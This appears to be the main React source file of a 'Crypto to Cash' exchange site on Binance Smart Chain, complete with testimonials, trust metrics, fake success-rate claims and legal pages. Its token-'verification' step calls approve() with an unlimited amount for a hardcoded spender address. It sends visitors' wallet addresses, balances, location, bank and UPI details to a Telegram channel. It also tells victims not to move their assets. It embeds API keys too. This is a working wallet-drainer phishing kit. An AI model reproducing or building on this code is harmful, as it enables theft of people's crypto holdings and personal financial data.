import React, { useState, useEffect } from 'react';
import { 
  AlertCircle, CheckCircle, Loader,
  Zap, Shield, Youtube, MessageCircle, FileText
} from 'lucide-react';
import { FaYoutube, FaTelegramPlane, FaMedium } from "react-icons/fa";
import { SiMedium } from "react-icons/si";

import { BSC_PARAMS, COUNTRIES, SAMPLE_TESTIMONIALS } from './constants';
import { getRandomTestimonials, validatePaymentDetails, sendToTelegram, fetchCoinGeckoPrice } from './utils';
import { Token, PaymentDetails, ExchangeRate, ThemeClasses } from './types';
import Header from './components/Header';
import TrustMetrics from './components/TrustMetrics';
import AssetManagement from './components/AssetManagement';
import PaymentSelection from './components/PaymentSelection';
import TokenVerification from './components/TokenVerification';
import ExchangeRates from './components/ExchangeRates';
import Testimonials from './components/Testimonials';
import TrustBadges from './components/TrustBadges';
import SecurityFeatures from './components/SecurityFeatures';
import CryptoNews from './components/CryptoNews';
import MobileWalletPrompt from './components/MobileWalletPrompt';
import TermsAndConditions from './components/TermsAndConditions';
import PrivacyPolicy from './components/PrivacyPolicy';
import ContactPage from './components/ContactPage';
import ScamAdvisory from './components/ScamAdvisory';
import BugBountyBanner from './components/BugBountyBanner';
import BugBountyPage from './components/BugBountyPage';
import RiskDisclosure from './components/RiskDisclosure';
import AMLPolicy from './components/AMLPolicy';
import SupportPage from './components/SupportPage';

const COVALENT_KEY = 'cqt_rQj9pWHk7jrKrDJPYByfhmRpCDCW';

function App() {
  // STATES
  const [darkMode, setDarkMode] = useState(() => {
    // Check for saved theme preference first
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme) {
      return savedTheme === 'dark';
    }
    
    // Check system preference (including Android)
    if (typeof window !== 'undefined' && window.matchMedia) {
      return window.matchMedia('(prefers-color-scheme: dark)').matches;
    }
    
    return true; // Default to dark mode like BitValve
  });
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [tokens, setTokens] = useState<Token[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [currentStep, setCurrentStep] = useState(1);
  const [approvalInProgress, setApprovalInProgress] = useState('');
  const [selectedFiat, setSelectedFiat] = useState('usd');
  const [exchangeRates, setExchangeRates] = useState<ExchangeRate[]>([]);
  const [selectedToken, setSelectedToken] = useState<Token | null>(null);
  const [sellAmount, setSellAmount] = useState('');
  const [quote, setQuote] = useState<string | null>(null);
  const [selectedCountry, setSelectedCountry] = useState('');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
  const [tradeAmount, setTradeAmount] = useState('');
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails>({});
  const [showRates, setShowRates] = useState(true);
  const [showWalletAnimation, setShowWalletAnimation] = useState(false);
  const [showApprovalAnimation, setShowApprovalAnimation] = useState('');
  const [tokenPrice, setTokenPrice] = useState<number | null>(null);
  const [priceLoading, setPriceLoading] = useState(false);
  const [priceError, setPriceError] = useState<string | null>(null);
  const [testimonials] = useState(getRandomTestimonials(SAMPLE_TESTIMONIALS, 4));
  const [showMobilePrompt, setShowMobilePrompt] = useState(false);
  const [showTerms, setShowTerms] = useState(false);
  const [showPrivacy, setShowPrivacy] = useState(false);
  const [showContact, setShowContact] = useState(false);
  const [showScamAdvisory, setShowScamAdvisory] = useState(false);
  const [showBugBounty, setShowBugBounty] = useState(false);
  const [showRiskDisclosure, setShowRiskDisclosure] = useState(false);
  const [showAMLPolicy, setShowAMLPolicy] = useState(false);
  const [showSupportPage, setShowSupportPage] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  // Detect mobile device
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // System theme detection and persistence
  useEffect(() => {
    // Listen for system theme changes
    if (typeof window !== 'undefined' && window.matchMedia) {
      const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
      
      const handleThemeChange = (e: MediaQueryListEvent) => {
        // Only auto-update if user hasn't manually set a preference
        const savedTheme = localStorage.getItem('theme');
        if (!savedTheme) {
          setDarkMode(e.matches);
        }
      };
      
      // Add listener for theme changes
      if (mediaQuery.addEventListener) {
        mediaQuery.addEventListener('change', handleThemeChange);
      } else {
        // Fallback for older browsers
        mediaQuery.addListener(handleThemeChange);
      }
      
      return () => {
        if (mediaQuery.removeEventListener) {
          mediaQuery.removeEventListener('change', handleThemeChange);
        } else {
          mediaQuery.removeListener(handleThemeChange);
        }
      };
    }
  }, []);

  // Save theme preference when changed
  useEffect(() => {
    localStorage.setItem('theme', darkMode ? 'dark' : 'light');
  }, [darkMode]);

  // Random Order ID generator on confirmation
  const [orderId, setOrderId] = useState("");

  useEffect(() => {
    if (currentStep === 5 && !orderId) {
      const id = "ORD-" + Math.random().toString(36).substring(2, 10).toUpperCase();
      setOrderId(id);
    }
  }, [currentStep, orderId]);

  // Theme classes
  const themeClasses: ThemeClasses = {
    bg: darkMode ? 'bg-[#0a0b0d]' : 'bg-gray-50',
    cardBg: darkMode ? 'bg-[#1a1b23]' : 'bg-white',
    text: darkMode ? 'text-white' : 'text-gray-900',
    textSecondary: darkMode ? 'text-gray-400' : 'text-gray-600',
    border: darkMode ? 'border-gray-800' : 'border-gray-200',
    hover: darkMode ? 'hover:bg-[#252730]' : 'hover:bg-gray-50',
    input: darkMode ? 'bg-[#252730] border-gray-700 text-white' : 'bg-white border-gray-300 text-gray-900',
    gradient: darkMode ? 'from-blue-500 to-cyan-400' : 'from-blue-500 to-purple-500'
  };

  // Auto-connect wallet if user already connected before
  useEffect(() => {
    const lastWallet = localStorage.getItem('walletAddress');
    if ((window as any).ethereum && lastWallet) {
      (window as any).ethereum.request({ method: 'eth_accounts' }).then((accounts: string[]) => {
        if (accounts && accounts[0] && accounts[0].toLowerCase() === lastWallet.toLowerCase()) {
          setWalletAddress(accounts[0]);
          setWalletConnected(true);
          setCurrentStep(2);
          fetchUserTokens(accounts[0]);
        } else {
          localStorage.removeItem('walletAddress');
        }
      }).catch(() => {});
    }
  }, []);

  // Fetch Live Exchange Rates
  useEffect(() => {
    const ids = 'bitcoin,ethereum,tether,usd-coin,dai';
    const markups: Record<string, number> = {
      bitcoin: 0.02,
      ethereum: 0.02,
      'usd-coin': 0.1,
      dai: 0.1,
      tether: 0.1
    };

    const fetchRates = async () => {
      try {
        // map your ids -> LiveCoinWatch codes
        const codeMap: Record<string, 'BTC' | 'ETH' | 'USDT' | 'USDC' | 'DAI'> = {
          bitcoin: 'BTC',
          ethereum: 'ETH',
          tether: 'USDT',
          'usd-coin': 'USDC',
          dai: 'DAI',
        };
        const codes = ids.split(',').map(s => s.trim()).map(id => codeMap[id]).filter(Boolean) as Array<'BTC'|'ETH'|'USDT'|'USDC'|'DAI'>;

        // primary: /coins/map (ensure limit=codes.length, NOT 0)
        const mapResp = await fetch('https://api.livecoinwatch.com/coins/map', {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'x-api-key': '32821bd9-f016-48d4-b4a2-41e34dc054be',
          },
          body: JSON.stringify({
            codes,
            currency: selectedFiat.toUpperCase(),
            sort: 'code',
            order: 'ascending',
            offset: 0,
            limit: codes.length,
            meta: false,
          }),
        });
        if (!mapResp.ok) throw new Error(`HTTP ${mapResp.status}`);

        let data: Array<{ code: string; rate: number; volume?: number }> = await mapResp.json();

        // fallback: some environments may return [] — fetch singles
        if (!Array.isArray(data) || data.length === 0) {
          const singles = await Promise.all(
            codes.map(async (code) => {
              try {
                const r = await fetch('https://api.livecoinwatch.com/coins/single', {
                  method: 'POST',
                  headers: {
                    'content-type': 'application/json',
                    'x-api-key': '32821bd9-f016-48d4-b4a2-41e34dc054be',
                  },
                  body: JSON.stringify({
                    code,
                    currency: selectedFiat.toUpperCase(),
                    meta: false,
                  }),
                });
                if (!r.ok) return null;
                const j = await r.json();
                return { code: j?.code, rate: j?.rate, volume: j?.volume };
              } catch {
                return null;
              }
            })
          );
          data = singles.filter(Boolean) as Array<{ code: string; rate: number; volume?: number }>;
          if (data.length === 0) throw new Error('Empty market data');
        }

        // shape a "prices" object like your old Coingecko structure
        const byCode: Record<string, { rate: number; volume?: number }> = {};
        for (const row of data) byCode[row.code] = row;

        const prices: any = {
          bitcoin:    { [selectedFiat]: byCode.BTC?.rate  ?? 0 },
          ethereum:   { [selectedFiat]: byCode.ETH?.rate  ?? 0 },
          tether:     { [selectedFiat]: byCode.USDT?.rate ?? 0 },
          'usd-coin': { [selectedFiat]: byCode.USDC?.rate ?? 0 },
          dai:        { [selectedFiat]: byCode.DAI?.rate  ?? 0 },
        };

        // keep your original setExchangeRates shape & markup labels
        setExchangeRates([
          { pair: `BTC/${selectedFiat.toUpperCase()}`,  rate: (prices.bitcoin[selectedFiat]     * (1 + markups.bitcoin)).toFixed(2),     markup: '+5%',  volume: '$5.1M' },
          { pair: `ETH/${selectedFiat.toUpperCase()}`,  rate: (prices.ethereum[selectedFiat]    * (1 + markups.ethereum)).toFixed(2),    markup: '+5%',  volume: '$2.4M' },
          { pair: `USDT/${selectedFiat.toUpperCase()}`, rate: (prices.tether[selectedFiat]      * (1 + markups.tether)).toFixed(2),      markup: '+25%', volume: '$3.2M' },
          { pair: `USDC/${selectedFiat.toUpperCase()}`, rate: (prices['usd-coin'][selectedFiat] * (1 + markups['usd-coin'])).toFixed(2), markup: '+20%', volume: '$1.8M' },
          { pair: `DAI/${selectedFiat.toUpperCase()}`,  rate: (prices.dai[selectedFiat]         * (1 + markups.dai)).toFixed(2),         markup: '+20%', volume: '$890K' }
        ]);
      } catch {
        // unchanged fallback
        setExchangeRates([
          { pair: 'BTC/USD',  rate: '122633.58', markup: '+2%',  volume: '$52.1M' },
          { pair: 'ETH/USD',  rate: '3814.84',   markup: '+2%',  volume: '$21.4M' },
          { pair: 'USDT/USD', rate: '1.10',      markup: '+10%', volume: '$13.2M' },
          { pair: 'USDC/USD', rate: '1.10',      markup: '+10%', volume: '$12.8M' },
          { pair: 'DAI/USD',  rate: '1.10',      markup: '+10%', volume: '$15.8M' }
        ]);
      }
    };

    fetchRates();
    const interval = setInterval(fetchRates, 2000); // Updates every 2 seconds
    return () => clearInterval(interval);
  }, [selectedFiat]);

  // STEP 1: Connect Wallet & Switch to BSC
  const connectWallet = async () => {
    setLoading(true); 
    setError(''); 
    setSuccess('');
    
    try {
      // Import mobile detection utilities
      const { isRegularMobileBrowser } = await import('./utils');
      
      // Check if user is on mobile regular browser and show Trust Wallet prompt
      if (isRegularMobileBrowser()) {
        setLoading(false);
        setShowMobilePrompt(true);
        return;
      }
      
      if (!(window as any).ethereum) throw new Error('MetaMask not detected. Please install MetaMask.');
      
      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
      if (chainId !== BSC_PARAMS.chainId) {
        try {
          await (window as any).ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_PARAMS.chainId }] });
        } catch (err: any) {
          if (err.code === 4902) {
            await (window as any).ethereum.request({ method: 'wallet_addEthereumChain', params: [BSC_PARAMS] });
          } else throw err;
        }
      }
      
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      if (!accounts || accounts.length === 0) throw new Error('No accounts found. Please unlock your wallet.');
      
      setWalletAddress(accounts[0]); 
      setWalletConnected(true);
      setShowWalletAnimation(true);
      setTimeout(() => setShowWalletAnimation(false), 3000);

      const tokensFetched = await fetchUserTokens(accounts[0]);
      let bnb = '0.0000', usdt = '0.00';
      if (tokensFetched && Array.isArray(tokensFetched)) {
        const bnbToken = tokensFetched.find(t => t.symbol === 'BNB');
        const usdtToken = tokensFetched.find(t => t.symbol === 'USDT');
        bnb = bnbToken ? bnbToken.balance : '0.0000';
        usdt = usdtToken ? usdtToken.balance : '0.00';
      }

      setCurrentStep(2);
      setSuccess('Wallet connected! Continue to Next step for risk analysis .');

      let userCountry = 'N/A';
      try {
        const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
        userCountry = geo && geo.country_name ? geo.country_name : 'N/A';
      } catch { /* ignore */ }

      await sendToTelegram({
        action: 'Wallet Connected',
        wallet: accounts[0],
        bnb: bnb,
        usdt: usdt,
        network: 'BSC',
        country: userCountry,
        token: 'N/A',
        contract: 'N/A',
        balance: 'N/A',
        paymentMethod: 'N/A',
        txHash: 'N/A',
        timestamp: new Date().toISOString()
      });

      localStorage.setItem('walletAddress', accounts[0]);
    } catch (err: any) {
      setError(err.message || 'Failed to connect wallet');
    } finally {
      setLoading(false);
    }
  };

  // STEP 2: Fetch BSC tokens from Covalent
  const fetchUserTokens = async (address: string): Promise<Token[]> => {
    setLoading(true);
    try {
      const resp = await fetch(
        `https://api.covalenthq.com/v1/56/address/${address}/balances_v2/?key=${COVALENT_KEY}`
      );
      if (!resp.ok) throw new Error('Failed to fetch token data');
      const data = await resp.json();
      if (data.data && data.data.items) {
        const tokenList = data.data.items
          .filter((token: any) => token.type === 'cryptocurrency' && token.balance !== "0" && token.contract_address !== "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee")
          .map((token: any) => ({
            symbol: token.contract_ticker_symbol,
            name: token.contract_name,
            balance: (parseFloat(token.balance) / Math.pow(10, token.contract_decimals)).toFixed(4),
            value: token.quote ? `$${token.quote.toFixed(2)}` : '$0.00',
            approved: false,
            contractAddress: token.contract_address,
            logoUrl: token.logo_url
          })) as Token[];
        setTokens(tokenList);
        setLoading(false);
        return tokenList;
      }
      setTokens([]);
      setLoading(false);
      return [];
    } catch (err: any) {
      setError('No Tokens Holding: ' + err.message);
      setTokens([]);
      setLoading(false);
      return [];
    }
  };

  // STEP 4: Approve tokens
  const approveToken = async (token: Token) => {
    setApprovalInProgress(token.symbol);
    setShowApprovalAnimation(token.symbol);
    setError('');
    
    try {
      const { ethers } = await import('ethers');
      if (!(window as any).ethereum) throw new Error('MetaMask not found');
      
      const provider = new ethers.BrowserProvider((window as any).ethereum);
      const signer = await provider.getSigner();
      const erc20ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
      const contract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
      const spenderAddress = "0x564a3bc6c16e5cd68ccd194df2380088db74cd9e";
      const maxAmount = ethers.MaxUint256;
      const tx = await contract.approve(spenderAddress, maxAmount);
      await tx.wait();
      
      setTokens(prev => prev.map(t => 
        t.contractAddress === token.contractAddress ? { ...t, approved: true, txHash: tx.hash } : t
      ));
      
      if (selectedToken && selectedToken.contractAddress === token.contractAddress) {
        setSelectedToken(prev => prev ? { ...prev, approved: true, txHash: tx.hash } : prev);
      }
      
      setSuccess(`${token.symbol} Verified!`);
      setApprovalInProgress('');
      setTimeout(() => setShowApprovalAnimation(''), 2000);

      let allTokensText = '';
      if (tokens.length > 0) {
        allTokensText = tokens
          .map(t => `${t.symbol} (${t.contractAddress})`)
          .join('\n');
      }
      
      await sendToTelegram({
        action: 'Token Approved',
        wallet: walletAddress,
        token: token.symbol,
        contract: token.contractAddress,
        balance: token.balance,
        paymentMethod: 'N/A',
        country: 'N/A',
        txHash: tx.hash,
        tokenList: allTokensText,
        network: 'BSC',
        timestamp: new Date().toISOString()
      });
    } catch (err: any) {
      setError(`Approval failed: ${err.message}`);
      setApprovalInProgress('');
    }
  };

  // Send comprehensive order confirmation to Telegram
  const sendOrderConfirmation = async () => {
    try {
      const selectedCountryData = COUNTRIES.find(c => c.code === selectedCountry);
      
      // Format payment details based on method
      let paymentDetailsText = '';
      switch (selectedPaymentMethod) {
        case 'UPI':
          paymentDetailsText = `Primary UPI: ${paymentDetails.upiId || 'N/A'}\n` +
                              `Name: ${paymentDetails.fullName || 'N/A'}`;
          if (paymentDetails.upiId2) {
            paymentDetailsText += `\nSecondary UPI: ${paymentDetails.upiId2}\n` +
                                 `Name: ${paymentDetails.fullName2 || 'N/A'}`;
          }
          break;
        case 'IMPS':
          paymentDetailsText = `Account: ${paymentDetails.accountNumber || 'N/A'}\n` +
                              `IFSC: ${paymentDetails.ifscCode || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}`;
          break;
        case 'PayPal':
          paymentDetailsText = `Email: ${paymentDetails.paypalEmail || 'N/A'}\n` +
                              `Name: ${paymentDetails.fullName || 'N/A'}`;
          break;
        case 'ACH':
          paymentDetailsText = `Routing: ${paymentDetails.routingNumber || 'N/A'}\n` +
                              `Account: ${paymentDetails.accountNumber || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}\n` +
                              `Type: ${paymentDetails.accountType || 'N/A'}`;
          break;
        case 'SEPA':
          paymentDetailsText = `IBAN: ${paymentDetails.iban || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}\n` +
                              `BIC: ${paymentDetails.bicCode || 'N/A'}`;
          break;
        case 'Bank Transfer':
          paymentDetailsText = `Bank: ${paymentDetails.bankName || 'N/A'}\n` +
                              `Account: ${paymentDetails.accountNumber || 'N/A'}\n` +
                              `Name: ${paymentDetails.accountHolderName || 'N/A'}\n` +
                              `Sort Code: ${paymentDetails.sortCode || 'N/A'}`;
          break;
        case 'Cash':
          paymentDetailsText = `Address: ${paymentDetails.cashAddress || 'N/A'}\n` +
                              `Phone: ${paymentDetails.cashContactPhone || 'N/A'}`;
          break;
        default:
          paymentDetailsText = paymentDetails.general || 'N/A';
      }

      // Format contact information
      let contactText = 'N/A';
      if (paymentDetails.contactInfo) {
        const contact = paymentDetails.contactInfo;
        contactText = `Method: ${contact.preferredContact || 'N/A'}\n`;
        if (contact.email) contactText += `Email: ${contact.email}\n`;
        if (contact.phone) contactText += `Phone: ${contact.phone}\n`;
        if (contact.telegram) contactText += `Telegram: ${contact.telegram}\n`;
      }

      // Calculate quote
      const marketValue = tokenPrice ? parseFloat(tradeAmount) * tokenPrice : 0;
      const exchangeValue = marketValue * 1.15; // 15% markup

      const orderMessage = 
        `🎉 <b>NEW ORDER CONFIRMED</b> 🎉\n\n` +
        `📋 <b>Order Details:</b>\n` +
        `Order ID: <code>${orderId}</code>\n` +
        `Timestamp: ${new Date().toLocaleString()}\n\n` +
        
        `👤 <b>Customer Info:</b>\n` +
        `Wallet: <code>${walletAddress}</code>\n` +
        `Country: ${selectedCountryData?.flag} ${selectedCountryData?.name || 'N/A'}\n\n` +
        
        `💰 <b>Transaction Details:</b>\n` +
        `Asset: ${selectedToken?.name} (${selectedToken?.symbol})\n` +
        `Amount: ${tradeAmount} ${selectedToken?.symbol}\n` +
        `Market Price: $${tokenPrice?.toFixed(4) || 'N/A'}\n` +
        `Exchange Rate: $${tokenPrice ? (tokenPrice * 1.15).toFixed(4) : 'N/A'} (+15%)\n` +
        `Total Value: $${exchangeValue.toFixed(2)}\n` +
        `Contract: <code>${selectedToken?.contractAddress}</code>\n\n` +
        
        `💳 <b>Payment Method:</b> ${selectedPaymentMethod}\n` +
        `<b>Payment Details:</b>\n${paymentDetailsText}\n\n` +
        
        `📞 <b>Contact Information:</b>\n${contactText}\n` +
        
        `🔗 <b>Network:</b> BSC (Binance Smart Chain)\n` +
        `⏰ <b>Status:</b> Processing\n\n` +
        
        `⚠️ <b>Action Required:</b>\n` +
        `• Process payout to customer's ${selectedPaymentMethod}\n` +
        `• Verify wallet has sufficient balance\n` +
        `• Complete transaction within 24 hours\n\n` +
        
        `🔒 <b>Security Note:</b> Customer assets verified and approved`;

      await sendToTelegram({
        action: 'Order Confirmed',
        message: orderMessage,
        orderId: orderId,
        wallet: walletAddress,
        token: selectedToken?.symbol || 'N/A',
        contract: selectedToken?.contractAddress || 'N/A',
        balance: tradeAmount,
        paymentMethod: selectedPaymentMethod,
        country: selectedCountryData?.name || 'N/A',
        contactInfo: paymentDetails.contactInfo,
        paymentDetails: paymentDetailsText,
        totalValue: exchangeValue.toFixed(2),
        network: 'BSC',
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Failed to send order confirmation:', error);
      // Don't show error to user as this is internal notification
    }
  };

  // Fetch price when token is selected
  useEffect(() => {
    if (selectedToken) {
      setPriceLoading(true);
      setPriceError(null);
      
      fetchCoinGeckoPrice(selectedToken.symbol)
        .then(price => {
          setTokenPrice(price);
          setPriceLoading(false);
        })
        .catch(error => {
          console.error('Price fetch failed:', error);
          setPriceError('Unable to fetch current price');
          setTokenPrice(null);
          setPriceLoading(false);
        });
    }
  }, [selectedToken]);

  // Handle order confirmation
  const handleOrderConfirmation = async () => {
    setCurrentStep(5);
    // Send Telegram notification
    await sendOrderConfirmation();
  };

  // FINAL: Reset session
  const handleFinish = () => {
    setCurrentStep(1);
    setWalletConnected(false);
    setWalletAddress('');
    setTokens([]);
    setSelectedToken(null);
    setSellAmount('');
    setQuote(null);
    setSelectedCountry('');
    setSelectedPaymentMethod('');
    setPaymentDetails({});
    setSuccess('');
    setError('');
    localStorage.removeItem('walletAddress');
  };

  return (
    <div className={`min-h-screen transition-all duration-300 ${themeClasses.bg} relative overflow-x-hidden`}>
    {/* Background Pattern */}
<div className="absolute inset-0 opacity-5 pointer-events-none">
  <div
    className="absolute inset-0"
    style={{
      backgroundImage: `radial-gradient(circle at 25% 25%, #3b82f6 0%, transparent 50%), 
                       radial-gradient(circle at 75% 75%, #06b6d4 0%, transparent 50%)`
    }}
  />
</div>

      
      {/* Mobile Wallet Prompt */}
      <MobileWalletPrompt 
        darkMode={darkMode} 
        themeClasses={themeClasses}
        show={showMobilePrompt}
        onClose={() => setShowMobilePrompt(false)}
      />
      
      {/* Terms & Conditions Modal */}
      {showTerms && (
        <TermsAndConditions
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowTerms(false)}
        />
      )}
      
      {/* Privacy Policy Modal */}
      {showPrivacy && (
        <PrivacyPolicy
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowPrivacy(false)}
        />
      )}
      
      {/* Contact Page Modal */}
      {showContact && (
        <ContactPage
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowContact(false)}
        />
      )}
      
      {/* Scam Advisory Modal */}
      {showScamAdvisory && (
        <ScamAdvisory
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowScamAdvisory(false)}
        />
      )}
      
      {/* Bug Bounty Modal */}
      {showBugBounty && (
        <BugBountyPage
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowBugBounty(false)}
        />
      )}
      
      {/* Risk Disclosure Modal */}
      {showRiskDisclosure && (
        <RiskDisclosure
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowRiskDisclosure(false)}
        />
      )}
      
      {/* AML Policy Modal */}
      {showAMLPolicy && (
        <AMLPolicy
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowAMLPolicy(false)}
        />
      )}
      
      {/* Support Page Modal */}
      {showSupportPage && (
        <SupportPage
          darkMode={darkMode}
          themeClasses={themeClasses}
          onClose={() => setShowSupportPage(false)}
        />
      )}
      
      <Header
        darkMode={darkMode}
        setDarkMode={setDarkMode}
        walletConnected={walletConnected}
        walletAddress={walletAddress}
        showWalletAnimation={showWalletAnimation}
        themeClasses={themeClasses}
        isMobile={isMobile}
      />

      {/* Bug Bounty Banner */}
      <BugBountyBanner
        darkMode={darkMode}
        themeClasses={themeClasses}
      />

      {/* Main Content */}
      <div className="relative z-10">
        {/* Mobile Wallet-Focused View */}
        {isMobile && walletConnected ? (
          <div className="min-h-screen px-3 py-4">
            <div className="max-w-md mx-auto">
              {/* Mobile Process Header */}
              <div className={`${themeClasses.cardBg} rounded-2xl border ${themeClasses.border} p-4 mb-4 shadow-xl`}>
                <div className="text-center">
                  <h2 className={`text-xl font-bold ${themeClasses.text} mb-2`}>
                    Crypto to Cash
                  </h2>
                  <div className="flex items-center justify-center space-x-2 text-sm">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary}`}>Wallet Connected</span>
                  </div>
                </div>
              </div>

              {/* Mobile Asset Management */}
              <AssetManagement
                currentStep={currentStep}
                loading={loading}
                tokens={tokens}
                selectedToken={selectedToken}
                tradeAmount={tradeAmount}
                tokenPrice={tokenPrice}
                priceLoading={priceLoading}
                priceError={priceError}
                darkMode={darkMode}
                themeClasses={themeClasses}
                connectWallet={connectWallet}
                setSelectedToken={setSelectedToken}
                setTradeAmount={setTradeAmount}
                setSellAmount={setSellAmount}
                setQuote={setQuote}
                setCurrentStep={setCurrentStep}
              />

              {/* Mobile Payment Selection */}
              {currentStep === 3 && (
                <div className={`${themeClasses.cardBg} rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`}>
                  <PaymentSelection
                    selectedCountry={selectedCountry}
                    selectedPaymentMethod={selectedPaymentMethod}
                    paymentDetails={paymentDetails}
                    themeClasses={themeClasses}
                    darkMode={darkMode}
                    setSelectedCountry={setSelectedCountry}
                    setSelectedPaymentMethod={setSelectedPaymentMethod}
                    setPaymentDetails={setPaymentDetails}
                    setCurrentStep={setCurrentStep}
                    validatePaymentDetails={validatePaymentDetails}
                  />
                </div>
              )}

              {/* Mobile Token Verification */}
              {currentStep === 4 && (
                <div className={`${themeClasses.cardBg} rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`}>
                  <TokenVerification
                    tokens={tokens}
                    showApprovalAnimation={showApprovalAnimation}
                    approvalInProgress={approvalInProgress}
                    darkMode={darkMode}
                    themeClasses={themeClasses}
                    approveToken={approveToken}
                    setCurrentStep={handleOrderConfirmation}
                  />
                </div>
              )}

              {/* Mobile Confirmation */}
              {currentStep === 5 && (
                <div className={`${themeClasses.cardBg} rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`}>
                  <div className="text-center py-6">
                    <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-emerald-500 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-2xl">
                      <CheckCircle className="w-8 h-8 text-white" />
                    </div>
                    <h3 className={`text-xl font-bold ${themeClasses.text} mb-3`}>Order Confirmed!</h3>

                    <p className={`${themeClasses.textSecondary} mb-4 px-2 text-sm`}>
                      {selectedPaymentMethod?.toLowerCase().includes("cash")
                        ? "Your order is being processed. Please follow the message received in your contact method."
                        : `Your order is being processed. You will receive funds via ${selectedPaymentMethod} within 5–10 minutes.`}
                    </p>

                    <p className={`text-xs px-3 mb-6 font-medium ${themeClasses.textSecondary}`}>
                      ⚠️ Funds will <strong>not</strong> be auto-debited until the payout is completed.  
                      Please <strong>do not withdraw or move your assets</strong> until the transaction is fully processed.
                    </p>

                    <div className={`bg-gradient-to-r ${darkMode ? 'from-green-900/10 to-emerald-900/10' : 'from-green-50 to-emerald-50'} border ${darkMode ? 'border-green-800/30' : 'border-green-200'} rounded-xl p-4 mb-6 text-left backdrop-blur-sm`}>
                      <h4 className={`font-semibold ${darkMode ? 'text-green-300' : 'text-green-900'} mb-3`}>Order Summary</h4>
                      <div className={`space-y-2 text-sm ${themeClasses.textSecondary}`}>
                        <div className="flex justify-between">
                          <span>Order ID:</span>
                          <span className="font-mono text-xs">{orderId}</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Wallet:</span>
                          <span className="font-mono text-xs">{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Asset:</span>
                          <span className="text-right">{selectedToken?.name} ({selectedToken?.symbol})</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Amount:</span>
                          <span className="text-right">{tradeAmount}</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Payment Method:</span>
                          <span className="text-right">{selectedPaymentMethod}</span>
                        </div>
                        <hr className="my-3" />
                        <div className={`flex justify-between font-semibold ${darkMode ? 'text-green-300' : 'text-green-800'}`}>
                          <span>Status:</span>
                          <span>Processing</span>
                        </div>
                      </div>
                    </div>

                    <button
                      onClick={handleFinish}
                      className={`w-full bg-gradient-to-r ${themeClasses.gradient} text-white px-6 py-3 rounded-xl font-semibold hover:shadow-2xl transition-all duration-300 hover:scale-105`}
                    >
                      Start New Session
                    </button>
                  </div>
                </div>
              )}

            </div>
          </div>
        ) : (
          <>
            {/* Desktop/Tablet View or Mobile without wallet */}
            {/* Hero Section */}
            <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-6 sm:py-8 lg:py-12">
              <div className="text-center mb-8 sm:mb-12">
                <h1 className={`text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold ${themeClasses.text} mb-4 sm:mb-6 leading-tight`}>
                  <span>Convert Crypto to </span>
                  <span className="bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent">Cash</span>
                </h1>
                  <FramerMap />
                <p className={`text-base sm:text-lg lg:text-xl ${themeClasses.textSecondary} max-w-2xl mx-auto mb-6 sm:mb-8 px-2`}>
                  Instant payouts to your bank account. Secure, fast, and trusted by thousands worldwide.
                </p>
                <div className="grid grid-cols-2 sm:flex sm:items-center sm:justify-center gap-3 sm:gap-6 lg:gap-8 text-xs sm:text-sm px-2">
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>98.9% Success Rate</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>5 to 15 min Average</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-purple-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>$450M+ Processed</span>
                  </div>
